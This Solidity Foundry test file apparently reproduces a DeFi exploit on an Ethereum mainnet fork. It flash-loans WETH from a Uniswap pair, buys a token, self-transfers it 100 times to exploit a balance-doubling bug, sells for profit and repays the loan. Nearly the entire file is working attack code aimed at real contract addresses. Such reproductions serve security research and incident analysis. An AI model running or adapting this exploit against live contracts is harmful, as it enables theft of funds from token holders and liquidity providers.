// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./test/interfaces/IUni_Pair_V2.sol";
import "./test/interfaces/IERC20.sol";
import "./test/interfaces/IPancakeRouter.sol";

contract GPUExploit is Test {
    IERC20 private vectoken;
    IERC20 private weth;
    IUni_Pair_V2 private wethUsdcPair;
    IPancakeRouter private router;
    address private attacker;

    modifier balanceLog() {
        emit log_named_decimal_uint("Attacker weth Balance Before exploit", getBalance(weth), 18);
        _;
        emit log_named_decimal_uint("Attacker weth Balance After exploit", getBalance(weth), 18);
    }

    function setUp() external {
        vm.createSelectFork("https://rpc.ankr.com/eth", 20656600);
        vectoken = IERC20(0x1BB9b64927e0C5e207C9DB4093b3738Eef5D8447);
        attacker = 0x7F6084ACCc66f5F6719b52dc1424EBa5bEE794EB;
        weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        wethUsdcPair = IUni_Pair_V2(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
        router = IPancakeRouter(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D ));
        weth.approve(address(router), type(uint256).max);
        vectoken.approve(address(router), type(uint256).max);
    }

    function testExploit() public balanceLog {
        emit log_named_decimal_uint(" weth Balance Before exploit", weth.balanceOf(address(this)), 18);
        weth.transfer(attacker, weth.balanceOf(address(this)));
        emit log_named_decimal_uint("Attacker external weth Balance Before exploit", weth.balanceOf(attacker), 18);
        wethUsdcPair.swap(0, 10_500 ether, address(this), "0x42");
    }

    function getPath(address token0, address token1) internal pure returns (address[] memory) {
        address[] memory path = new address[](2);
        path[0] = token0;
        path[1] = token1;
        return path;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        emit log_named_decimal_uint("Attacker weth Balance Before exploit", getBalance(weth), 18);
        //Buy tokens with flashloaned busd
        _swap(weth.balanceOf(address(this)), weth, vectoken);
        emit log_named_decimal_uint("Attacker vectoken Balance after buy", getBalance(vectoken), 18);

        //Self transfer tokens to double tokens on each transfer
        for (uint256 i = 0; i < 100; i++) {
            vectoken.transfer(address(this), getBalance(vectoken));
        }

        emit log_named_decimal_uint("Attacker vectoken Balance after exploit", getBalance(vectoken), 18);

        //Sell all tokens to busd
        _swap(vectoken.balanceOf(address(this)), vectoken, weth);
        emit log_named_decimal_uint("Attacker vectoken Balance after sell to weth", getBalance(vectoken), 18);
        emit log_named_decimal_uint("Attacker weth Balance after sell", getBalance(weth), 18);

        //Payback flashloan
        uint256 feeAmount = (amount1 * 3) / 1000 + 1;
        weth.transfer(address(wethUsdcPair), amount1 + feeAmount);
    }

    function _swap(uint256 amountIn, IERC20 tokenA, IERC20 tokenB) private {
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, getPath(address(tokenA), address(tokenB)), address(this), block.timestamp
        );
    }

    function getBalance(IERC20 token) private view returns (uint256) {
        return token.balanceOf(address(this));
    }
}